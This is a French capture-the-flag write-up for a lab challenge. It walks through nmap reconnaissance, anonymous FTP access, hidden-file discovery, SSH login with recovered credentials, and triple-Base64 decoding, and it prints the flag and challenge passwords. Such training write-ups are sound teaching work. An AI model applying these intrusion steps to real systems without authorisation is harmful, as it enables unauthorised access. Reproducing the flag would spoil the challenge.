Yer a Wizard #1
> **Catégorie :** Reconnaissance / FTP anonyme / SSH
> **Cible :** `10.10.0.14` (l'IP change à chaque redémarrage du container)
> **Flag :** `EPI{0n3_kaN_n3v3R_haV3_3n0U9H_50CK2}`
---
Objectif
Prendre pied sur une machine « Hogwarts » à partir de rien : trouver un point
d'entrée, récupérer des identifiants dissimulés sur le service FTP, se connecter
en SSH, puis extraire le flag caché derrière plusieurs couches d'encodage.
Le fil rouge du challenge est la dissimulation : le service laisse traîner
des fichiers cachés, et l'un d'eux est un leurre destiné à faire perdre du temps.
---
1. Connexion au VPN
Tous les challenges tournent sur un réseau isolé accessible uniquement par VPN.
Il faut donc d'abord établir le tunnel.
```bash
# Installation d'OpenVPN dans WSL (une seule fois)
sudo apt update
sudo apt install openvpn -y

# Connexion avec le profil fourni sur le dashboard
sudo openvpn /mnt/c/Users/youss/Downloads/EPI_Youssef_Zouaoui.ovpn
```
> **À retenir :** on laisse ce terminal ouvert **sans y toucher** pendant toute
> la session. Le fermer coupe le tunnel et fait perdre l'accès à la cible.
> On travaille donc dans un **second** terminal.
Pour vérifier que le tunnel est bien monté :
```bash
ip a | grep tun0        # on doit voir une interface tun0 avec une IP en 10.8.0.x
```
---
2. Récupération de l'IP cible
En lançant le challenge depuis le dashboard, une IP est attribuée au container :
```
Cible : 10.10.0.14
```
Cette IP est éphémère : à chaque relance du challenge, elle change. Il faut
la re-vérifier si on reprend plus tard.
---
3. Scan de reconnaissance (Nmap)
Avant toute chose, on cartographie la surface d'attaque : quels ports sont
ouverts, quels services tournent, et dans quelles versions.
```bash
nmap -sV -sC 10.10.0.14
```
`-sV` → version detection : identifie le logiciel et sa version derrière
chaque port ouvert (utile pour chercher des vulnérabilités connues).
`-sC` → lance les scripts NSE par défaut (`default category`), qui font une
reconnaissance approfondie automatique (bannières, config par défaut,
FTP anonyme autorisé, etc.).
On repère notamment le port 21 (FTP) avec l'anonymat autorisé, et le
port 22 (SSH) — notre porte de sortie une fois les identifiants trouvés.
---
4. Exploitation du FTP anonyme
Le FTP autorise la connexion `anonymous`, ce qui signifie qu'on peut lister et
télécharger des fichiers sans identifiants.
```bash
ftp 10.10.0.14
```
Login : `anonymous`
Mot de passe : (vide, on appuie juste sur Entrée)
Une fois connecté, on liste tout, y compris les fichiers cachés :
```
ls -la
```
> `ls` seul ne montre pas les fichiers commençant par un point (`.`).
> L'option `-a` (all) est **indispensable** : c'est là que se cachent les
> indices dans ce genre de challenge.
On découvre deux éléments intéressants :
un fichier caché `.hidden`
un dossier nommé `...` (trois points) — un nom trompeur qui se fond avec
les entrées `.` et `..` classiques, donc facile à rater.
---
5. Exploration du dossier `...`
Le dossier `...` est justement là pour être ignoré. On y entre et on liste à
nouveau :
```
cd ...
ls -la
```
→ On y trouve le vrai fichier : `.reallyHidden`.
---
6. Récupération et lecture des fichiers
On télécharge le fichier sur notre machine puis on quitte le FTP :
```
get .reallyHidden
bye
```
De retour dans le shell local :
```bash
cat .reallyHidden
```
→ Message :
```
FINE! My password is IAlreadySaidTooMuch
```
Le piège (red herring)
Le premier fichier `.hidden` contenait aussi un mot de passe :
`Il0veTheMalefoys`. Mais il ne fonctionne pas en SSH. C'était un leurre
volontaire pour nous faire perdre du temps. Le bon mot de passe est celui du
fichier réellement caché, `.reallyHidden`.
> **Leçon :** ne jamais s'arrêter au premier indice trouvé. Un CTF bien conçu
> plante souvent de fausses pistes.
---
7. Connexion SSH
Avec le bon mot de passe, on se connecte en SSH sous l'utilisateur `hagrid` :
```bash
ssh hagrid@10.10.0.14
```
Mot de passe : `IAlreadySaidTooMuch`
→ Accès obtenu :
```
hagrid@hogwarts:~$
```
---
8. Recherche et décodage du flag
Une fois sur la machine, on cherche le fichier `user.txt` classique :
```bash
find / -name "user.txt" 2>/dev/null
cat <chemin/vers/user.txt>
```
Le contenu n'est pas directement le flag : il est encodé en 3 couches
successives de Base64. Il faut décoder trois fois de suite :
```bash
cat user.txt | base64 -d | base64 -d | base64 -d
```
> Chaque `base64 -d` retire une couche. On sait qu'on a fini quand la sortie
> ressemble enfin à un flag lisible au format `EPI{...}`.
→ Flag final :
```
EPI{0n3_kaN_n3v3R_haV3_3n0U9H_50CK2}
```
---
Concepts clés à retenir
Concept	Explication
FTP anonyme	Un service FTP mal configuré autorise la connexion sans compte, exposant ses fichiers à tout le monde.
Fichiers/dossiers cachés	Un nom commençant par `.` (ou `...`) est masqué par un `ls` standard. Toujours utiliser `ls -la`.
Red herring	Faux indice délibéré. Un mot de passe trouvé n'est valide que s'il fonctionne réellement — il faut le tester.
Encodage en couches	Le Base64 n'est pas du chiffrement : c'est réversible sans clé. Ici il est empilé 3 fois pour ralentir.
---
Résumé de la chaîne d'attaque
```
VPN → nmap (recon) → FTP anonyme → ls -la → dossier "..." →
.reallyHidden → mot de passe → SSH (hagrid) → user.txt →
base64 -d ×3 → FLAG
```